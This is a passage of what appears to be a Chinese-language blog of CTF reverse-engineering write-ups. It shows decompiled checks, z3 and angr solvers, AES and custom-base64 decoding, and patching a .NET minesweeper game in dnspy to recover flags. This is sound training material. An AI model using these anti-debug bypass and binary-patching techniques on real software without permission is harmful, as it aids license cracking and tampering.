_flag += <span class="built_in">bytes</span>([_data[i]])</span><br><span class="line"><span class="built_in">print</span>(_flag)</span><br><span class="line"></span><br><span class="line">s = <span class="string">b&quot;7381940526&quot;</span></span><br><span class="line">flag = [<span class="number">0</span>] * <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    flag[s[i] - <span class="number">0x30</span>] = _flag[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-simple-CPP"><a href="#GXYCTF2019-simple-CPP" class="headerlink" title="[GXYCTF2019]simple CPP"></a>[GXYCTF2019]simple CPP</h3><p>分为三部分</p><h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p>输入异或加密</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = flag;</span><br><span class="line">    <span class="keyword">if</span> ( v41 &gt;= <span class="number">0x10</span> )</span><br><span class="line">      v9 = *(<span class="keyword">char</span> **)flag;</span><br><span class="line">    v10 = qword_7FF69D5F6048;                 <span class="comment">// i_will_check_is_debug_or_not</span></span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)qword_7FF69D5F6060 &gt;= <span class="number">0x10</span> )</span><br><span class="line">      v10 = *(<span class="keyword">char</span> **)qword_7FF69D5F6048;</span><br><span class="line">    v6[v8] = v9[v8] ^ v10[v7 % <span class="number">27</span>];</span><br><span class="line">    ++v7;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v7 &lt; flag_len );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p>转为64位整数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v17 = *v16 + v11;</span><br><span class="line">    ++v15;</span><br><span class="line">    ++v16;</span><br><span class="line">    <span class="keyword">switch</span> ( v15 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        v14 = v17;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">        v13 = v17;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line">        v12 = v17;</span><br><span class="line">LABEL_23:</span><br><span class="line">        v17 = <span class="number">0</span>i64;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">        sub_7FF69D5F19C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">&quot;ERRO,out of range&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v11 = v17 &lt;&lt; <span class="number">8</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v15 &lt; (<span class="keyword">int</span>)flag_len );</span><br></pre></td></tr></table></figure><h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><p>一堆运算后进行校验</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v38 = x[<span class="number">2</span>];</span><br><span class="line">  v19 = x[<span class="number">1</span>];</span><br><span class="line">  v20 = *x;</span><br><span class="line">  v21 = (__int64 *)<span class="keyword">operator</span> <span class="keyword">new</span>(<span class="number">0x20</span>ui64);</span><br><span class="line">  <span class="keyword">if</span> ( IsDebuggerPresent() )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_7FF69D5F19C0(<span class="built_in">std</span>::<span class="built_in">cout</span>, (__int64)<span class="string">&quot;Hi , DO not debug me !&quot;</span>);</span><br><span class="line">    Sleep(<span class="number">0x7D0</span>u);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v22 = v19 &amp; v20;</span><br><span class="line">  *v21 = v19 &amp; v20;</span><br><span class="line">  v23 = v38 &amp; ~v20;</span><br><span class="line">  v21[<span class="number">1</span>] = v23;</span><br><span class="line">  v24 = ~v19;</span><br><span class="line">  v25 = v38 &amp; v24;</span><br><span class="line">  v21[<span class="number">2</span>] = v38 &amp; v24;</span><br><span class="line">  v26 = v20 &amp; v24;</span><br><span class="line">  v21[<span class="number">3</span>] = v26;</span><br><span class="line">  <span class="keyword">if</span> ( v23 != <span class="number">0x11204161012</span>i64 )</span><br><span class="line">  &#123;</span><br><span class="line">    v21[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">    v23 = <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  v27 = v23 | v22 | v25 | v26;</span><br><span class="line">  v28 = x[<span class="number">1</span>];</span><br><span class="line">  v29 = x[<span class="number">2</span>];</span><br><span class="line">  v30 = v25 &amp; *x | v29 &amp; (v22 | v28 &amp; ~*x | ~(v28 | *x));</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v30 == <span class="number">0x8020717153E3013</span>i64 )</span><br><span class="line">    v31 = v27 == <span class="number">0x3E3A4717373E7F1F</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( (v27 ^ x[<span class="number">3</span>]) == <span class="number">0x3E3A4717050F791F</span>i64 )</span><br><span class="line">    v3 = v31;</span><br><span class="line">  <span class="keyword">if</span> ( (v23 | v22 | v28 &amp; v29) == (~*x &amp; v29 | <span class="number">0xC00020130082C0C</span>i64) &amp;&amp; v3 )</span><br></pre></td></tr></table></figure><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p>用z3直接暴力解，发现多解，搜wp发现比赛当时主办方给了提示，差不多是<code>flag[8:16] == &#39;e!P0or_a&#39; </code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">x = [BitVec(<span class="string">&#x27;x%d&#x27;</span> % i, <span class="number">8</span>*<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">v38 = x[<span class="number">2</span>]</span><br><span class="line">v19 = x[<span class="number">1</span>]</span><br><span class="line">v20 = x[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">v21 = [<span class="number">0</span>] * <span class="number">4</span></span><br><span class="line"></span><br><span class="line">v22 = v19 &amp; v20</span><br><span class="line">v21[<span class="number">0</span>] = v19 &amp; v20</span><br><span class="line">v23 = v38 &amp; ~v20</span><br><span class="line">v21[<span class="number">1</span>] = v23</span><br><span class="line">v24 = ~v19</span><br><span class="line">v25 = v38 &amp; v24</span><br><span class="line">v21[<span class="number">2</span>] = v38 &amp; v24</span><br><span class="line">v26 = v20 &amp; v24</span><br><span class="line">v21[<span class="number">3</span>] = v26</span><br><span class="line"></span><br><span class="line">s.add(v23 == <span class="number">0x11204161012</span>)</span><br><span class="line"></span><br><span class="line">v27 = v23 | v22 | v25 | v26</span><br><span class="line">v28 = x[<span class="number">1</span>]</span><br><span class="line">v29 = x[<span class="number">2</span>]</span><br><span class="line">v30 = v25 &amp; x[<span class="number">0</span>] | v29 &amp; (v22 | v28 &amp; ~x[<span class="number">0</span>] | ~(v28 | x[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">s.add(v30 == <span class="number">0x8020717153E3013</span>)</span><br><span class="line">s.add(v27 == <span class="number">0x3E3A4717373E7F1F</span>)</span><br><span class="line">s.add(v27 ^ x[<span class="number">3</span>] == <span class="number">0x3E3A4717050F791F</span>)</span><br><span class="line"></span><br><span class="line">s.add((v23 | v22 | v28 &amp; v29) == ((~x[<span class="number">0</span>] &amp; v29 | <span class="number">0xC00020130082C0C</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line"></span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        _data = []</span><br><span class="line">        tmp = m[x[i]].as_long()</span><br><span class="line">        <span class="comment"># print(hex(tmp))</span></span><br><span class="line">        <span class="keyword">while</span> tmp:</span><br><span class="line">            _data.append(tmp &amp; <span class="number">0xff</span>)</span><br><span class="line">            tmp &gt;&gt;= <span class="number">8</span></span><br><span class="line">        data += _data[::-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># print(list(map(hex, data)))</span></span><br><span class="line"></span><br><span class="line">    xor_data = <span class="string">b&quot;i_will_check_is_debug_or_not&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">        data[i] ^= xor_data[i]</span><br><span class="line">    </span><br><span class="line">    data = data[:<span class="number">27</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(data))</span><br><span class="line"></span><br><span class="line">    flag = <span class="string">b&quot;&quot;</span></span><br><span class="line">    flag += <span class="built_in">bytes</span>(data[:<span class="number">8</span>])</span><br><span class="line">    flag += <span class="string">b&#x27;e!P0or_a&#x27;</span></span><br><span class="line">    flag += <span class="built_in">bytes</span>(data[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="findKey"><a href="#findKey" class="headerlink" title="findKey"></a>findKey</h3><p>通过字符串找到核心代码（偏移0x1640），花指令nop即可</p><p>从后往前，先异或得到最后对比的值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">b&quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;</span></span><br><span class="line"></span><br><span class="line">s1 = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    s1 += <span class="built_in">bytes</span>([i ^ <span class="built_in">ord</span>(<span class="string">&quot;S&quot;</span>)])</span><br><span class="line"><span class="built_in">print</span>(s1) <span class="comment"># c8837b23ff8aaa8a2dde915473ce0991</span></span><br></pre></td></tr></table></figure><p>根据所查，该函数为求得md5值</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002203439352.png" alt="image-20211002203439352"></p><p>则通过<a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a>得到<code>123321</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002203532357.png" alt="image-20211002203532357"></p><p>查交叉引用，可知String1在sub_401B20函数赋值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __stdcall <span class="title">sub_401B20</span><span class="params">(HWND hDlg, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x110</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x111</span>:</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int16)a3 != <span class="number">1</span> &amp;&amp; (<span class="keyword">unsigned</span> __int16)a3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">      EndDialog(hDlg, (<span class="keyword">unsigned</span> __int16)a3);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x202</span>:</span><br><span class="line">LABEL_6:</span><br><span class="line">      String1[dword_428C50++] = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x205</span>:</span><br><span class="line">      String1[dword_428C50++] = <span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x208</span>:</span><br><span class="line">      <span class="keyword">if</span> ( dword_428D58 &lt; <span class="number">3</span> )</span><br><span class="line">        ++dword_428D5C;</span><br><span class="line">      String1[dword_428C50++] = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将<code>0x110 0x111 等数字</code>丢进谷歌所搜，找到<a href="https://www.cnblogs.com/zhanglei1371/p/6664829.html">AHK的OnMessage - zhanglei1371 - 博客园 (cnblogs.com)</a>，则有</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WM_LBUTTONUP  0x202</span><br><span class="line">WM_RBUTTONUP  0x205</span><br><span class="line">WM_MBUTTONUP  0x208</span><br></pre></td></tr></table></figure><p>根据<a href="https://baike.baidu.com/item/WM_LBUTTONDOWN/1513446">WM_LBUTTONDOWN_百度百科 (baidu.com)</a>知道WM_LBUTTONDOWN是一个Windows消息，该消息当用户在window客户区域点击鼠标左键的时候发送。则我们根据已知可知我们需要在特定区域点击</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">左 中 右 右 中  左</span><br></pre></td></tr></table></figure><p>根据题目猜测是在<code>Help =&gt; About</code>弹出的区域进行点击，后得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002211707288.png" alt="image-20211002211707288"></p><h3 id="GWCTF-2019-re3"><a href="#GWCTF-2019-re3" class="headerlink" title="[GWCTF 2019]re3"></a>[GWCTF 2019]re3</h3><p>代码自修改， 密钥生成直接动调过，原AES加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">data = [<span class="number">0xBC</span>, <span class="number">0x0A</span>, <span class="number">0xAD</span>, <span class="number">0xC0</span>, <span class="number">0x14</span>, <span class="number">0x7C</span>, <span class="number">0x5E</span>, <span class="number">0xCC</span>, <span class="number">0xE0</span>, <span class="number">0xB1</span>, <span class="number">0x40</span>, <span class="number">0xBC</span>, <span class="number">0x9C</span>, <span class="number">0x51</span>, <span class="number">0xD5</span>, <span class="number">0x2B</span>, <span class="number">0x46</span>, <span class="number">0xB2</span>, <span class="number">0xB9</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0xE5</span>, <span class="number">0x32</span>, <span class="number">0x4B</span>, <span class="number">0xAD</span>, <span class="number">0x7F</span>, <span class="number">0xB4</span>, <span class="number">0xB3</span>, <span class="number">0x9C</span>, <span class="number">0xDB</span>, <span class="number">0x4B</span>, <span class="number">0x5B</span>]</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>([<span class="number">0xCB</span>, <span class="number">0x8D</span>, <span class="number">0x49</span>, <span class="number">0x35</span>, <span class="number">0x21</span>, <span class="number">0xB4</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, <span class="number">0xC1</span>, <span class="number">0xAE</span>, <span class="number">0x7E</span>, <span class="number">0x62</span>, <span class="number">0x22</span>, <span class="number">0x92</span>, <span class="number">0x66</span>, <span class="number">0xCE</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">bytes</span>(data)</span><br><span class="line">obj = AES.new(key, AES.MODE_ECB)</span><br><span class="line">plain = obj.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure><h3 id="特殊的-BASE64"><a href="#特殊的-BASE64" class="headerlink" title="特殊的 BASE64"></a>特殊的 BASE64</h3><p>c++, 没有去符号表</p><p>base64换表加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">b&#x27;mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI==&#x27;</span></span><br><span class="line"></span><br><span class="line">new_table = <span class="string">b&quot;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0987654321/+&quot;</span></span><br><span class="line"></span><br><span class="line">old_table = <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = s.translate(<span class="built_in">bytes</span>.maketrans(new_table, old_table))</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(s))</span><br></pre></td></tr></table></figure><h3 id="FlareOn5-Minesweeper-Championship-Registration"><a href="#FlareOn5-Minesweeper-Championship-Registration" class="headerlink" title="[FlareOn5]Minesweeper Championship Registration"></a>[FlareOn5]Minesweeper Championship Registration</h3><p>jadx打开看到flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002213012376.png" alt="image-20211002213012376"></p><h3 id="网鼎杯-2020-青龙组-jocker"><a href="#网鼎杯-2020-青龙组-jocker" class="headerlink" title="[网鼎杯 2020 青龙组]jocker"></a>[网鼎杯 2020 青龙组]jocker</h3><p><a href="https://lantern.cool/wp-games-2020wd/">2020 网鼎杯 | Lantern’s 小站</a></p><h3 id="ACTF新生赛2020-SoulLike"><a href="#ACTF新生赛2020-SoulLike" class="headerlink" title="[ACTF新生赛2020]SoulLike"></a>[ACTF新生赛2020]SoulLike</h3><p>直接angr</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./SoulLike&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x400000</span>+ <span class="number">0x00000000001117D</span>, avoid=[<span class="number">0x400000</span>+<span class="number">0x0000000000111A1</span>, <span class="number">0x400000</span> + <span class="number">0x00000000001102D</span>])</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><h3 id="2019红帽杯-xx"><a href="#2019红帽杯-xx" class="headerlink" title="[2019红帽杯]xx"></a>[2019红帽杯]xx</h3><p><a href="https://lantern.cool/wp-games-2019redhat/">2019 红帽杯 | Lantern’s 小站</a></p><h3 id="FlareOn5-Ultimate-Minesweeper"><a href="#FlareOn5-Ultimate-Minesweeper" class="headerlink" title="[FlareOn5]Ultimate Minesweeper"></a>[FlareOn5]Ultimate Minesweeper</h3><p>.Net 用 dnspy, 主要flag生成函数在下图中的SucessPopup中</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002215543589.png" alt="image-20211002215543589"></p><p>其中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private void SquareRevealedCallback(uint column, uint row)</span><br><span class="line">&#123;</span><br><span class="line">if (this.MineField.BombRevealed) // 判断是否为雷区</span><br><span class="line">&#123;</span><br><span class="line">this.stopwatch.Stop();</span><br><span class="line">Application.DoEvents();</span><br><span class="line">Thread.Sleep(1000);</span><br><span class="line">new FailurePopup().ShowDialog();</span><br><span class="line">Application.Exit();</span><br><span class="line">&#125;</span><br><span class="line">this.RevealedCells.Add(row * MainForm.VALLOC_NODE_LIMIT + column);</span><br><span class="line">if (this.MineField.TotalUnrevealedEmptySquares == 0)</span><br><span class="line">&#123;</span><br><span class="line">this.stopwatch.Stop();</span><br><span class="line">Application.DoEvents();</span><br><span class="line">Thread.Sleep(1000);</span><br><span class="line">new SuccessPopup(this.GetKey(this.RevealedCells)).ShowDialog();</span><br><span class="line">Application.Exit();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 BombRevealed 实现如下, 通过变量名知道通过MinesVisible来判断是否显示</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public bool BombRevealed</span><br><span class="line">&#123;</span><br><span class="line">get</span><br><span class="line">&#123;</span><br><span class="line">int num = 0;</span><br><span class="line">while ((long)num &lt; (long)((ulong)this.Size))</span><br><span class="line">&#123;</span><br><span class="line">int num2 = 0;</span><br><span class="line">while ((long)num2 &lt; (long)((ulong)this.Size))</span><br><span class="line">&#123;</span><br><span class="line">if (this.MinesPresent[num2, num] &amp;&amp; this.MinesVisible[num2, num])</span><br><span class="line">&#123;</span><br><span class="line">return true;</span><br><span class="line">&#125;</span><br><span class="line">num2++;</span><br><span class="line">&#125;</span><br><span class="line">num++;</span><br><span class="line">&#125;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到打印函数，将显示直接修改为true, 保存</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002221942727.png" alt="image-20211002221942727"></p><p>将所有全部打印出来，点下那三个8得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002222025703.png" alt="image-20211002222025703"></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002222044310.png" alt="image-20211002222044310"></p><h3 id="FlareOn1-Bob-Doge"><a href="#FlareOn1-Bob-Doge" class="headerlink" title="[FlareOn1]Bob Doge"></a>[FlareOn1]Bob Doge</h3><p>加压得到一个C1.exe程序，双击解压出一个Challenge1.exe</p><p>动调直接拿到flag</p><p>p.s. 题目描述的密码用来干什么的？</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002223333528.png" alt="image-20211002223333528"></p><h3 id="MRCTF2020-PixelShooter"><a href="#MRCTF2020-PixelShooter" class="headerlink" title="[MRCTF2020]PixelShooter"></a>[MRCTF2020]PixelShooter</h3><p>Unity游戏，解压找Assembly-CSharp.dl， dnspy打开，在UIContoller找到flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002224419962.png" alt="image-20211002224419962"></p><h3 id="equation"><a href="#equation" class="headerlink" title="equation"></a>equation</h3><p>jsf**k编码</p><p>拿正则表达式解码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function deEquation(str) &#123;</span><br><span class="line">  for (let i = 0; i &lt;= 1; i++) &#123;</span><br><span class="line">  str = str.replace(/l\[(\D*?)](\+l|-l|==)/g, (m, a, b) =&gt; &#x27;l[&#x27; + eval(a) + &#x27;]&#x27; + b);</span><br><span class="line">  &#125;</span><br><span class="line">  str = str.replace(/==(\D*?)&amp;&amp;/g, (m, a) =&gt; &#x27;==&#x27; + eval(a) + &#x27;&amp;&amp;&#x27;);</span><br><span class="line">  return str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再z3解密即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">l = [Int(<span class="string">&quot;l%d&quot;</span>%i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2a</span>)]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">    s.add(i&gt;<span class="number">0</span>)</span><br><span class="line">    s.add(i&lt;<span class="number">255</span>)</span><br><span class="line">s.add(l[<span class="number">40</span>]+l[<span class="number">35</span>]+l[<span class="number">34</span>]-l[<span class="number">0</span>]-l[<span class="number">15</span>]-l[<span class="number">37</span>]+l[<span class="number">7</span>]+l[<span class="number">6</span>]-l[<span class="number">26</span>]+l[<span class="number">20</span>]+l[<span class="number">19</span>]+l[<span class="number">8</span>]-l[<span class="number">17</span>]-l[<span class="number">14</span>]-l[<span class="number">38</span>]+l[<span class="number">1</span>]-l[<span class="number">9</span>]+l[<span class="number">22</span>]+l[<span class="number">41</span>]+l[<span class="number">3</span>]-l[<span class="number">29</span>]-l[<span class="number">36</span>]-l[<span class="number">25</span>]+l[<span class="number">5</span>]+l[<span class="number">32</span>]-l[<span class="number">16</span>]+l[<span class="number">12</span>]-l[<span class="number">24</span>]+l[<span class="number">30</span>]+l[<span class="number">39</span>]+l[<span class="number">10</span>]+l[<span class="number">2</span>]+l[<span class="number">27</span>]+l[<span class="number">28</span>]+l[<span class="number">21</span>]+l[<span class="number">33</span>]-l[<span class="number">18</span>]+l[<span class="number">4</span>]==<span class="number">861</span>)</span><br><span class="line">s.add(l[<span class="number">31</span>]+l[<span class="number">26</span>]+l[<span class="number">11</span>]-l[<span class="number">33</span>]+l[<span class="number">27</span>]-l[<span class="number">3</span>]+l[<span class="number">12</span>]+l[<span class="number">30</span>]+l[<span class="number">1</span>]+l[<span class="number">32</span>]-l[<span class="number">16</span>]+l[<span class="number">7</span>]+l[<span class="number">10</span>]-l[<span class="number">25</span>]+l[<span class="number">38</span>]-l[<span class="number">41</span>]-l[<span class="number">14</span>]-l[<span class="number">19</span>]+l[<span class="number">29</span>]+l[<span class="number">36</span>]-l[<span class="number">9</span>]-l[<span class="number">28</span>]-l[<span class="number">6</span>]-l[<span class="number">0</span>]-l[<span class="number">22</span>]-l[<span class="number">18</span>]+l[<span class="number">20</span>]-l[<span class="number">37</span>]+l[<span class="number">4</span>]-l[<span class="number">24</span>]+l[<span class="number">34</span>]-l[<span class="number">21</span>]-l[<span class="number">39</span>]-l[<span class="number">23</span>]-l[<span class="number">8</span>]-l[<span class="number">40</span>]+l[<span class="number">15</span>]-l[<span class="number">35</span>]==-<span class="number">448</span>)</span><br><span class="line">s.add(l[<span class="number">26</span>]+l[<span class="number">14</span>]+l[<span class="number">15</span>]+l[<span class="number">9</span>]+l[<span class="number">13</span>]+l[<span class="number">30</span>]-l[<span class="number">11</span>]+l[<span class="number">18</span>]+l[<span class="number">23</span>]+l[<span class="number">7</span>]+l[<span class="number">3</span>]+l[<span class="number">12</span>]+l[<span class="number">25</span>]-l[<span class="number">24</span>]-l[<span class="number">39</span>]-l[<span class="number">35</span>]-l[<span class="number">20</span>]+l[<span class="number">40</span>]-l[<span class="number">8</span>]+l[<span class="number">10</span>]-l[<span class="number">5</span>]-l[<span class="number">33</span>]-l[<span class="number">31</span>]+l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">21</span>]-l[<span class="number">6</span>]+l[<span class="number">1</span>]+l[<span class="number">16</span>]+l[<span class="number">17</span>]+l[<span class="number">29</span>]+l[<span class="number">22</span>]-l[<span class="number">4</span>]-l[<span class="number">36</span>]+l[<span class="number">41</span>]+l[<span class="number">38</span>]+l[<span class="number">2</span>]+l[<span class="number">0</span>]==<span class="number">1244</span>)</span><br><span class="line">s.add(l[<span class="number">5</span>]+l[<span class="number">22</span>]+l[<span class="number">15</span>]+l[<span class="number">2</span>]-l[<span class="number">28</span>]-l[<span class="number">10</span>]-l[<span class="number">3</span>]-l[<span class="number">13</span>]-l[<span class="number">18</span>]+l[<span class="number">30</span>]-l[<span class="number">9</span>]+l[<span class="number">32</span>]+l[<span class="number">19</span>]+l[<span class="number">34</span>]+l[<span class="number">23</span>]-l[<span class="number">17</span>]+l[<span class="number">16</span>]-l[<span class="number">7</span>]+l[<span class="number">24</span>]-l[<span class="number">39</span>]+l[<span class="number">8</span>]-l[<span class="number">12</span>]-l[<span class="number">40</span>]-l[<span class="number">25</span>]+l[<span class="number">37</span>]-l[<span class="number">35</span>]+l[<span class="number">11</span>]-l[<span class="number">14</span>]+l[<span class="number">20</span>]-l[<span class="number">27</span>]+l[<span class="number">4</span>]-l[<span class="number">33</span>]-l[<span class="number">21</span>]+l[<span class="number">31</span>]-l[<span class="number">6</span>]+l[<span class="number">1</span>]+l[<span class="number">38</span>]-l[<span class="number">29</span>]==-<span class="number">39</span>)</span><br><span class="line">s.add(l[<span class="number">41</span>]-l[<span class="number">29</span>]+l[<span class="number">23</span>]-l[<span class="number">4</span>]+l[<span class="number">20</span>]-l[<span class="number">33</span>]+l[<span class="number">35</span>]+l[<span class="number">3</span>]-l[<span class="number">19</span>]-l[<span class="number">21</span>]+l[<span class="number">11</span>]+l[<span class="number">26</span>]-l[<span class="number">24</span>]-l[<span class="number">17</span>]+l[<span class="number">37</span>]+l[<span class="number">1</span>]+l[<span class="number">16</span>]-l[<span class="number">0</span>]-l[<span class="number">13</span>]+l[<span class="number">7</span>]+l[<span class="number">10</span>]+l[<span class="number">14</span>]+l[<span class="number">22</span>]+l[<span class="number">39</span>]-l[<span class="number">40</span>]+l[<span class="number">34</span>]-l[<span class="number">38</span>]+l[<span class="number">32</span>]+l[<span class="number">25</span>]-l[<span class="number">2</span>]+l[<span class="number">15</span>]+l[<span class="number">6</span>]+l[<span class="number">28</span>]-l[<span class="number">8</span>]-l[<span class="number">5</span>]-l[<span class="number">31</span>]-l[<span class="number">30</span>]-l[<span class="number">27</span>]==<span class="number">485</span>)</span><br><span class="line">s.add(l[<span class="number">13</span>]+l[<span 